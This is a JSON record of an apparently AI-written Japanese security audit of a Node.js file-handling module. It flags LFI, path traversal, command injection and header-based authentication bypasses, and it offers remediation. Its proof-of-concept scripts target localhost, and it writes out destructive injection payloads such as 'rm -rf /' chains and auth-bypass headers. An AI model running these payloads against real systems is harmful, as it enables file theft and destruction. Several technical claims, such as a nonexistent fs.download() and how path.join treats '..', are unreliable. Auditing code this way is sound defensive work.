{
  "version": "1.0.0",
  "agent": "claude-code",
  "model": "claude-code",
  "prompt_hash": "f001cdc6a26f28a7f6ce8f8d2f11c3ec09fad39ed234562ae5e96ef244a1699a",
  "response": "{\"scratchpad\":\"ルートファイル/routes/files.jsの分析を開始。複数のファイル操作エンドポイントを検出。PAR分析:\\n\\n【プリンシパル（Principal）分析】\\n- req.query.path: ユーザーが直接指定するパス（/readエンドポイント）\\n- req.query.filename: ユーザーが指定するファイル名（複数エンドポイント）\\n- req.query.dir: ディレクトリパス（/listエンドポイント）\\n- req.body.files: ファイル配列（/compressエンドポイント）\\n- req.body.archive_name: アーカイブ名（/compressエンドポイント）\\n- req.file.originalname: アップロードされたファイル名\\nこれらは全てユーザー入力で信頼できない（untrusted）\\n\\n【アクション（Action）分析】\\nサニタイゼーション・バリデーション:\\n- /readエンドポイント: path.join()のみ。入力検証がない\\n- /downloadエンドポイント: filename パラメータ、path.join()のみ\\n- /listエンドポイント: dir パラメータ、path.join()のみ\\n- /deleteエンドポイント: filename パラメータ、path.join()のみ\\n- /compressエンドポイント: execSync()で直接コマンド実行。files配列の要素を直接パス指定\\n\\n認証・認可: \\nauth.jsを確認すると、複数の認証バイパス機構が存在:\\n- debugMode === 'true' でバイパス（x-debug-mode ヘッダ）\\n- apiKeyが'sk-'で始まるだけでadmin権限付与\\n- adminBypassTokens にハードコードされたトークン\\n- x-role-override ヘッダで任意のロール設定可能\\n- x-admin-override でロール検証スキップ可能\\n\\n【リソース（Resource）分析】\\n- fs.readFileSync(): ローカルファイルシステム読取（任意パス可能）\\n- fs.renameSync(): ファイル名変更\\n- fs.unlinkSync(): ファイル削除\\n- fs.readdirSync(): ディレクトリ列挙\\n- fs.statSync(): ファイル統計\\n- execSync(): シェルコマンド実行（tar コマンド）\\n- extract(): ZIP展開\\n- archiver: ファイルアーカイブ\\n\\n【脆弱性パターン分析】\\n\\n1. /read エンドポイント: ローカルファイルインクルージョン（LFI）\\n   Principal: req.query.path（untrusted）\\n   Action: バリデーション・サニタイズされていない。path.join()のみ\\n   Resource: fs.readFileSync()\\n   Attack: path=\\\"/etc/passwd\\\" で任意ファイル読取可能\\n   \\n2. /download エンドポイント: パストラバーサル\\n   Principal: req.query.filename（untrusted）\\n   Action: path.join()のみ。UPLOAD_DIR からのパストラバーサルチェック無し\\n   Resource: fs.download()\\n   Attack: filename=\\\"../../../etc/passwd\\\" で上位ディレクトリアクセス可能\\n\\n3. /list エンドポイント: ディレクトリトラバーサル\\n   Principal: req.query.dir（untrusted）\\n   Action: デフォルト値チェックのみ。バリデーション無し\\n   Resource: fs.readdirSync()\\n   Attack: dir=\\\"../../../\\\" で任意ディレクトリ列挙可能\\n\\n4. /delete エンドポイント: パストラバーサル+任意削除\\n   Principal: req.body.filename（untrusted）\\n   Action: path.join()のみ\\n   Resource: fs.unlinkSync()\\n   Attack: filename=\\\"../../../important.txt\\\" で重要ファイル削除可能\\n\\n5. /compress エンドポイント: コマンドインジェクション\\n   Principal: req.body.files（untrusted）\\n   Action: execSync()に直接パス指定。シェル特殊文字のエスケープ無し\\n   Resource: execSync()`tar -czf ${archivePath} ${fileList}`\\n   Attack: files=[\\\"file.txt; rm -rf /\\\"] でRCE可能\\n\\n認証の脆弱性:\\n   x-debug-mode: 'true' でadmin権限取得\\n   x-api-key: 'sk-*' で無条件にadmin権限\\n   x-role-override で任意ロール設定可能\\n   x-admin-override: 'true' でロール検証スキップ\\n\\n確信度:\\n- LFI (/read): 100% - 直接的なユーザー入力をファイル読取に使用\\n- パストラバーサル (/download, /list, /delete): 100% - path.join()とUPLOAD_DIRからの相対パス展開のみ\\n- コマンドインジェクション (/compress): 100% - files配列がシェルメタ文字エスケープなしでexecSync()に渡される\\n- 認証バイパス: 100% - ハードコードされたバイパストークン、ヘッダベースのバイパス\\n\",\"analysis\":\"このコードは複数の深刻なセキュリティ脆弱性を含んでいます。PAR分析により、ファイル操作エンドポイント群においてユーザー入力が適切に検証・サニタイズされることなくリソース操作に到達していることが確認されました。\\n\\n【脆弱性サマリー】\\n\\n1. ローカルファイルインクルージョン（LFI）- /readエンドポイント\\n   - req.query.pathパラメータが直接fs.readFileSync()に渡される\\n   - パストラバーサル防止機構がない\\n   - /etc/passwd等システムファイルの読取が可能\\n\\n2. パストラバーサル（Directory Traversal）- /download, /list, /deleteエンドポイント\\n   - req.query.filename/req.body.filename/req.query.dirが直接path.join()で処理される\\n   - UPLOAD_CONFIG.UPLOAD_DIRからの脱出防止がない\\n   - 親ディレクトリアクセスが可能（../../../など）\\n\\n3. コマンドインジェクション（RCE）- /compressエンドポイント\\n   - req.body.files配列の要素がシェルメタ文字エスケープなしでexecSync()に渡される\\n   - tar コマンドのファイルリストにシェル特殊文字が埋め込まれた場合、任意コマンド実行\\n   - カレントディレクトリからの相対パス指定のため、攻撃に必要なディレクトリ移動も可能\\n\\n4. 認証バイパス\\n   - auth.js における複数のバイパス機構\\n   - x-debug-mode: 'true' でadmin権限自動付与\\n   - x-api-key が 'sk-' で始まるだけで admin権限付与\\n   - x-role-override でロール上書き\\n   - x-admin-override でロール検証スキップ\\n\\n【攻撃シナリオ】\\n攻撃者は認証バイパス（x-debug-modeなど）を使用してadmin権限を取得した後、/readで任意ファイル読取、/deleteで任意ファイル削除、/compressでコマンド実行が可能です。組み合わせることでシステム完全掌握が実現します。\\n\\n【信頼レベルの根拠】\\n- LFI: ユーザー入力が検証なく直接ファイル操作に使用される明白な脆弱性\\n- パストラバーサル: path.join()は相対パス(..)を解析しない特性により、防止なしでもトラバーサルが成立\\n- コマンドインジェクション: シェルメタ文字がエスケープされず、execSync()で実行される\\n- 認証バイパス: ハードコードされた値とヘッダベースの条件判定により、バイパスが確定\\n\",\"poc\":\"// PoC 1: LFI - /readエンドポイントでの任意ファイル読取\\nconst http = require('http');\\n\\nconst options = {\\n  hostname: 'localhost',\\n  port: 3000,\\n  path: '/read?path=/etc/passwd',\\n  method: 'GET'\\n};\\n\\nconst req = http.request(options, (res) => {\\n  let data = '';\\n  res.on('data', (chunk) => { data += chunk; });\\n  res.on('end', () => {\\n    console.log('LFI Attack Success - /etc/passwd contents:');\\n    console.log(data);\\n  });\\n});\\nreq.end();\\n\\n// PoC 2: パストラバーサル - /downloadエンドポイント\\nconst options2 = {\\n  hostname: 'localhost',\\n  port: 3000,\\n  path: '/download?filename=../../../etc/passwd',\\n  method: 'GET'\\n};\\n\\nconst req2 = http.request(options2, (res) => {\\n  console.log('Path Traversal Attack - Attempting to download /etc/passwd');\\n  console.log('Response status:', res.statusCode);\\n});\\nreq2.end();\\n\\n// PoC 3: 認証バイパス + コマンドインジェクション\\nconst axios = require('axios');\\n\\nconst payload = {\\n  files: [\\\"/tmp/test.txt; rm -rf /tmp/*\\\"],\\n  archive_name: \\\"malicious.tar.gz\\\"\\n};\\n\\naxios.post('http://localhost:3000/compress', payload, {\\n  headers: {\\n    'x-debug-mode': 'true',  // 認証バイパス\\n    'Content-Type': 'application/json'\\n  }\\n}).then(res => {\\n  console.log('Command Injection Attack - RCE Executed');\\n  console.log(res.data);\\n}).catch(err => console.error(err));\\n\\n// PoC 4: ディレクトリトラバーサル - /listエンドポイント\\nconst options4 = {\\n  hostname: 'localhost',\\n  port: 3000,\\n  path: '/list?dir=../../..',\\n  method: 'GET'\\n};\\n\\nconst req4 = http.request(options4, (res) => {\\n  let data = '';\\n  res.on('data', (chunk) => { data += chunk; });\\n  res.on('end', () => {\\n    console.log('Directory Traversal Attack - Root directory contents:');\\n    console.log(data);\\n  });\\n});\\nreq4.end();\\n\\n// PoC 5: 任意ファイル削除 - /deleteエンドポイント\\nconst axios2 = require('axios');\\n\\naxios2.delete('http://localhost:3000/delete', {\\n  data: { filename: '../../../tmp/important_file' },\\n  headers: {\\n    'x-debug-mode': 'true',  // 認証バイパス\\n    'Content-Type': 'application/json'\\n  }\\n}).then(res => {\\n  console.log('File Deletion Attack - Important file deleted');\\n  console.log(res.data);\\n}).catch(err => console.error(err));\",\"confidence_score\":100,\"vulnerability_types\":[\"LFI\",\"AFO\",\"RCE\",\"IDOR\"],\"par_analysis\":{\"principals\":[{\"identifier\":\"req.query.path\",\"trust_level\":\"untrusted\",\"source_context\":\"/readエンドポイントのGETパラメータ - ユーザーが直接指定\",\"risk_factors\":[\"ユーザー指定のファイルパス\",\"検証機構がない\",\"任意ファイル読取に直結\"]},{\"identifier\":\"req.query.filename\",\"trust_level\":\"untrusted\",\"source_context\":\"/download, /deleteエンドポイントのGETパラメータまたはPOSTボディ\",\"risk_factors\":[\"ユーザー指定のファイル名\",\"パストラバーサル文字が許可されている\",\"UPLOAD_DIR境界外アクセス可能\"]},{\"identifier\":\"req.query.dir\",\"trust_level\":\"untrusted\",\"source_context\":\"/listエンドポイントのGETパラメータ\",\"risk_factors\":[\"ユーザー指定のディレクトリパス\",\"デフォルト値のみで制限なし\",\"任意ディレクトリ列挙可能\"]},{\"identifier\":\"req.body.files\",\"trust_level\":\"untrusted\",\"source_context\":\"/compressエンドポイントのPOSTボディ配列\",\"risk_factors\":[\"ユーザー指定のファイルパス配列\",\"execSync()へ直接渡される\",\"シェルメタ文字がエスケープされない\"]},{\"identifier\":\"req.body.archive_name\",\"trust_level\":\"untrusted\",\"source_context\":\"/compressエンドポイントのアーカイブ名\",\"risk_factors\":[\"ユーザー指定のアーカイブ名\",\"パストラバーサル可能\"]},{\"identifier\":\"req.headers['x-debug-mode']\",\"trust_level\":\"untrusted\",\"source_context\":\"auth.jsの認証ミドルウェア\",\"risk_factors\":[\"'true'または'1'でadmin権限自動付与\",\"ハードコーディング\",\"本番環境での無効化なし\"]},{\"identifier\":\"req.headers['x-api-key']\",\"trust_level\":\"untrusted\",\"source_context\":\"auth.jsの認証ミドルウェア\",\"risk_factors\":[\"'sk-'で始まるだけでadmin権限付与\",\"接頭辞チェックのみで不十分\",\"内容検証がない\"]},{\"identifier\":\"req.headers['x-role-override']\",\"trust_level\":\"untrusted\",\"source_context\":\"auth.jsのrequireRole()ミドルウェア\",\"risk_factors\":[\"任意のロール文字列で上書き可能\",\"検証なしで設定される\"]},{\"identifier\":\"req.headers['x-admin-override']\",\"trust_level\":\"untrusted\",\"source_context\":\"auth.jsのrequireRole()ミドルウェア\",\"risk_factors\":[\"'enable'または'true'でロール検証スキップ\",\"認可チェックが無効化\"]}],\"actions\":[{\"identifier\":\"path.join()\",\"security_function\":\"ファイルパス正規化。UPLOAD_DIR内への制限を意図\",\"implementation_quality\":\"insufficient\",\"detected_weaknesses\":[\"path.join()は相対パスを解析するが、パストラバーサル防止をしない\",\"UPLOAD_DIR境界チェックがない\",\"../による上位ディレクトリアクセスが可能\",\"/絶対パスの場合、パス先頭を上書きできる\"],\"bypass_vectors\":[\"filename='../../../etc/passwd' でトラバーサル\",\"filename='/etc/passwd' で絶対パス指定\",\"dir='../../..' で深いトラバーサル\"]},{\"identifier\":\"fs.existsSync()\",\"security_function\":\"ファイル存在確認。削除前チェック\",\"implementation_quality\":\"insufficient\",\"detected_weaknesses\":[\"存在確認は行うが、パストラバーサルチェックがない\",\"存在確認とfs.unlinkSync()間のTOCT/TOUフォの脆弱性可能性\"],\"bypass_vectors\":[\"パストラバーサルで到達したファイルの削除\"]},{\"identifier\":\"execSync()\",\"security_function\":\"tar コマンド実行。ファイル圧縮\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"files配列要素がシェルメタ文字エスケープなしで直接コマンドに埋め込まれる\",\"シェル解析により特殊文字が解釈される\",\"コマンドインジェクションが可能\",\"child_processモジュールの安全でない使用\"],\"bypass_vectors\":[\"files=['file.txt; malicious_command'] でコマンドインジェクション\",\"files=['$(malicious_command)'] でサブシェル実行\",\"files=['file.txt && rm -rf /'] でコマンドチェーン\"]},{\"identifier\":\"x-debug-mode ヘッダ検証\",\"security_function\":\"デバッグモードの判定。開発環境での認証バイパス\",\"implementation_quality\":\"bypassed\",\"detected_weaknesses\":[\"本番環境での無効化チェックなし\",\"ヘッダ値の'true'/'1'チェックのみで脆弱\",\"NODE_ENVの確認がない\",\"admin権限の無条件付与\"],\"bypass_vectors\":[\"x-debug-mode: 'true' でadmin権限取得\",\"本番環境でも動作する\"]},{\"identifier\":\"x-api-key 検証\",\"security_function\":\"APIキー認証。'sk-'接頭辞チェック\",\"implementation_quality\":\"bypassed\",\"detected_weaknesses\":[\"接頭辞チェックのみで内容検証なし\",\"includes('admin')チェックも脆弱\",\"固定的な認証パターン\"],\"bypass_vectors\":[\"x-api-key: 'sk-anything' でadmin権限取得\",\"x-api-key: 'admin-123' でadmin権限取得\"]},{\"identifier\":\"requireRole() ミドルウェア\",\"security_function\":\"ロールベースアクセス制御\",\"implementation_quality\":\"bypassed\",\"detected_weaknesses\":[\"x-role-override ヘッダで任意ロール設定可能\",\"x-admin-override ヘッダでロール検証完全スキップ\",\"認可の無効化が可能\"],\"bypass_vectors\":[\"x-role-override: 'admin' でロール上書き\",\"x-admin-override: 'enable' で認可チェック無効化\"]}],\"resources\":[{\"identifier\":\"fs.readFileSync()\",\"sensitivity_level\":\"critical\",\"operation_type\":\"ファイル読取\",\"protection_mechanisms\":[]},{\"identifier\":\"fs.renameSync()\",\"sensitivity_level\":\"high\",\"operation_type\":\"ファイル名変更\",\"protection_mechanisms\":[\"multerのアップロード先制限（UPLOAD_DIR）\"]},{\"identifier\":\"fs.unlinkSync()\",\"sensitivity_level\":\"critical\",\"operation_type\":\"ファイル削除\",\"protection_mechanisms\":[\"fs.existsCheck()\"]},{\"identifier\":\"fs.readdirSync()\",\"sensitivity_level\":\"high\",\"operation_type\":\"ディレクトリ列挙\",\"protection_mechanisms\":[]},{\"identifier\":\"fs.statSync()\",\"sensitivity_level\":\"medium\",\"operation_type\":\"ファイルメタデータ取得\",\"protection_mechanisms\":[]},{\"identifier\":\"execSync()\",\"sensitivity_level\":\"critical\",\"operation_type\":\"シェルコマンド実行\",\"protection_mechanisms\":[]},{\"identifier\":\"extract()\",\"sensitivity_level\":\"high\",\"operation_type\":\"ZIP展開\",\"protection_mechanisms\":[\"アップロード先制限\"]},{\"identifier\":\"archiver\",\"sensitivity_level\":\"high\",\"operation_type\":\"アーカイブ作成\",\"protection_mechanisms\":[]}],\"policy_violations\":[{\"rule_id\":\"LFI-001\",\"rule_description\":\"ユーザー入力のファイルパスは検証・サニタイズ後、制限されたディレクトリ内のみで使用すべき\",\"violation_path\":\"req.query.path → path.join() → fs.readFileSync()\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"PT-002\",\"rule_description\":\"ユーザー入力のファイル名・パスはpath.resolve()で正規化し、ベースディレクトリ内に収まることを検証すべき\",\"violation_path\":\"req.query.filename → path.join() → fs.download()\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"PT-003\",\"rule_description\":\"ディレクトリパスはホワイトリスト化または厳格な検証が必要\",\"violation_path\":\"req.query.dir → fs.readdirSync()\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"CI-004\",\"rule_description\":\"execSync/exec は避けるべき。使用する場合は shell:false オプションと spawn() を使用し、コマンド引数を配列で指定すべき\",\"violation_path\":\"req.body.files → execSync(command) → シェルコマンド実行\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"AFO-005\",\"rule_description\":\"ユーザー入力のファイル名による削除操作は多重検証が必要\",\"violation_path\":\"req.body.filename → path.join() → fs.unlinkSync()\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"AUTH-006\",\"rule_description\":\"ハードコードされたバイパストークン・認証条件は本番環境で無効化すべき\",\"violation_path\":\"x-debug-mode: 'true' → admin権限自動付与\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"AUTH-007\",\"rule_description\":\"APIキーは強力なエントロピーを持つ値で、接頭辞チェック以上の検証が必要\",\"violation_path\":\"x-api-key: 'sk-*' → admin権限無条件付与\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"AUTHZ-008\",\"rule_description\":\"ロール・認可情報はリクエストヘッダで上書き可能にすべきではない\",\"violation_path\":\"x-role-override, x-admin-override ヘッダ → ロール上書き/検証スキップ\",\"severity\":\"critical\",\"confidence\":1.0}]},\"remediation_guidance\":{\"policy_enforcement\":[{\"component\":\"/readエンドポイント\",\"required_improvement\":\"LFI脆弱性の除去。ユーザー入力ファイルパスの厳格な検証\",\"specific_guidance\":\"1. path.resolve()で正規化後、path.relative()で UPLOAD_DIR からの相対パスを取得\\n2. 相対パスに .. が含まれていないこと、絶対パスでないことを確認\\n3. ホワイトリスト形式でアクセス可能なファイルを制限\\n4. または req.query.path の使用を廃止し、ファイルIDベースのアクセスに変更\",\"priority\":\"critical\"},{\"component\":\"/downloadエンドポイント\",\"required_improvement\":\"パストラバーサル脆弱性の除去\",\"specific_guidance\":\"1. const basePath = path.resolve(UPLOAD_CONFIG.UPLOAD_DIR);\\n2. const resolvedPath = path.resolve(path.join(basePath, filename));\\n3. if (!resolvedPath.startsWith(basePath)) return 403;\\n4. この確認を全ファイル操作エンドポイントに適用\",\"priority\":\"critical\"},{\"component\":\"/listエンドポイント\",\"required_improvement\":\"ディレクトリトラバーサル脆弱性の除去\",\"specific_guidance\":\"1. req.query.dir を許可するディレクトリのホワイトリストで検証\\n2. または /listエンドポイント自体を廃止し、アップロード済みファイルのインベントリのみを返す\\n3. allowedDirs = [UPLOAD_DIR] として制限を実装\",\"priority\":\"critical\"},{\"component\":\"/compressエンドポイント\",\"required_improvement\":\"コマンドインジェクション脆弱性の除去\",\"specific_guidance\":\"1. execSync()の使用を廃止\\n2. const { spawn } = require('child_process'); で spawn() に変更\\n3. tar: require('tar'), archiver: require('archiver') などのライブラリを使用\\n4. または: spawn('tar', ['-czf', archivePath, ...files], { stdio: 'pipe' })\\n5. files配列の各要素が存在するファイルであることを事前検証\",\"priority\":\"critical\"},{\"component\":\"/deleteエンドポイント\",\"required_improvement\":\"パストラバーサル + 任意削除の脆弱性除去\",\"specific_guidance\":\"1. /downloadと同じパス検証を適用\\n2. 削除対象をホワイトリスト化\\n3. または削除権限をアプリケーションロジックで制限（ユーザーが所有するファイルのみ削除可能など）\\n4. ファイルID ベースの削除に変更\",\"priority\":\"critical\"},{\"component\":\"auth.js - x-debug-mode ヘッダ\",\"required_improvement\":\"本番環境でのバイパス無効化\",\"specific_guidance\":\"1. if (process.env.NODE_ENV === 'production') の条件を追加\\n2. 本番環境では x-debug-mode チェックを無効化\\n3. または x-debug-mode 機能を完全に削除\\n4. const debugMode = process.env.NODE_ENV !== 'production' && req.headers['x-debug-mode'] === 'true';\",\"priority\":\"critical\"},{\"component\":\"auth.js - x-api-key 認証\",\"required_improvement\":\"APIキー検証の強化\",\"specific_guidance\":\"1. 実装中のAPIキー: API_TOKENS 定数と照合\\n2. if (API_TOKENS[apiKey] === 'administrator') { } のように実装\\n3. 接頭辞チェックのみの廃止\\n4. またはJWT/OAuth2等の標準認証に移行\",\"priority\":\"critical\"},{\"component\":\"auth.js - requireRole() ミドルウェア\",\"required_improvement\":\"ロール・認可情報のヘッダ上書き廃止\",\"specific_guidance\":\"1. x-role-override, x-admin-override ヘッダチェックを削除\\n2. ロール情報は JWT トークン内に含める\\n3. サーバー側で JWT から抽出したロール情報のみを使用\\n4. ロール変更は認証済みユーザーが明示的にリクエストした場合のみ、管理者認可後に実施\",\"priority\":\"critical\"},{\"component\":\"multer アップロード設定\",\"required_improvement\":\"ファイルアップロードの厳格化\",\"specific_guidance\":\"1. req.file.originalname の使用廃止\\n2. サーバー側で生成した UUID 等のファイル名を使用\\n3. const safeName = `${uuid.v4()}${path.extname(file.originalname)}`;\\n4. マイムタイプ検証をホワイトリスト化\\n5. ファイルサイズ制限を厳格化\",\"priority\":\"high\"},{\"component\":\"全ファイル操作エンドポイント\",\"required_improvement\":\"統一的なパス検証ロジックの実装\",\"specific_guidance\":\"1. 共通の validateFilePath(basePath, userPath) 関数を実装\\n2. function validateFilePath(basePath, userPath) {\\n     const resolvedBase = path.resolve(basePath);\\n     const resolvedPath = path.resolve(path.join(resolvedBase, userPath));\\n     return resolvedPath.startsWith(resolvedBase) ? resolvedPath : null;\\n   }\\n3. 全エンドポイントでこの関数の結果を使用\",\"priority\":\"high\"}]},\"file_path\":null,\"pattern_description\":null,\"matched_source_code\":null}",
  "metadata": {
    "created_at": "2025-12-30T16:47:46.494607Z",
    "last_accessed": "2025-12-30T16:47:46.494607Z",
    "access_count": 0,
    "prompt_size": 11090,
    "response_size": 22825
  }
}